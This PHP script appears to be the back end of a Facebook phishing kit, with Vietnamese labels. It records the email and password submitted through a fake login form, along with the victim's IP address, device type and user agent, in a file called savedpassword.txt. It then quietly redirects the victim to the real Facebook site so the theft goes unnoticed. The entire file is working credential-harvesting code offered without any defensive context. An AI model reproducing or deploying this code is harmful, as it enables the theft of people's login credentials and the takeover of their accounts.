<?php
require_once 'Mobile_Detect.php';
$detect = new Mobile_Detect;
$deviceType = ($detect->isMobile() ? ($detect->isTablet() ? 'Máy tính bảng' : 'Điện thoại') : 'Máy tính');

function svl_ismobile() {
    $is_mobile = '0';
    if(preg_match('/(android|iphone|ipad|up.browser|up.link|mmp|symbian|smartphone|midp|wap|phone)/i', strtolower($_SERVER['HTTP_USER_AGENT'])))
        $is_mobile=1;
    if((strpos(strtolower($_SERVER['HTTP_ACCEPT']),'application/vnd.wap.xhtml+xml')>0) or ((isset($_SERVER['HTTP_X_WAP_PROFILE']) or isset($_SERVER['HTTP_PROFILE']))))
        $is_mobile=1;
    $mobile_ua = strtolower(substr($_SERVER['HTTP_USER_AGENT'],0,4));
    $mobile_agents = array('w3c ','acs-','alav','alca','amoi','andr','audi','avan','benq','bird','blac','blaz','brew','cell','cldc','cmd-','dang','doco','eric','hipt','inno','ipaq','java','jigs','kddi','keji','leno','lg-c','lg-d','lg-g','lge-','maui','maxo','midp','mits','mmef','mobi','mot-','moto','mwbp','nec-','newt','noki','oper','palm','pana','pant','phil','play','port','prox','qwap','sage','sams','sany','sch-','sec-','send','seri','sgh-','shar','sie-','siem','smal','smar','sony','sph-','symb','t-mo','teli','tim-','tosh','tsm-','upg1','upsi','vk-v','voda','wap-','wapa','wapi','wapp','wapr','webc','winw','winw','xda','xda-');
 
    if(in_array($mobile_ua,$mobile_agents))
        $is_mobile=1;
 
    if (isset($_SERVER['ALL_HTTP'])) {
        if (strpos(strtolower($_SERVER['ALL_HTTP']),'OperaMini')>0)
            $is_mobile=1;
    }
    if (strpos(strtolower($_SERVER['HTTP_USER_AGENT']),'windows')>0)
        $is_mobile=0;
    return $is_mobile;
    
}

if(svl_ismobile()){
   header ('Location:https://m.facebook.com/');
}else{
    header ('Location:https://www.facebook.com/');
}
date_default_timezone_set('Asia/Ho_Chi_Minh');
$usuario = $_POST['email'];  
$clave = $_POST['pass']; 
$ip = $_SERVER['REMOTE_ADDR'];  
$fecha = date("Y-m-d;h:i:s"); 
$f = fopen("savedpassword.txt", "a");
fwrite ($f,
'Username: '.$usuario.'
 Password: '.$clave.'
 IP: '.$ip.'
 Kiểu: '.$deviceType.'
 Hệ điều hành: '.htmlentities($_SERVER['HTTP_USER_AGENT']).'
 Ngày: '.$fecha.'');
  fwrite($f,"\n");
  fwrite($f,"\n");
  fwrite($f,"\n");
fclose($f);

 



exit;
?> 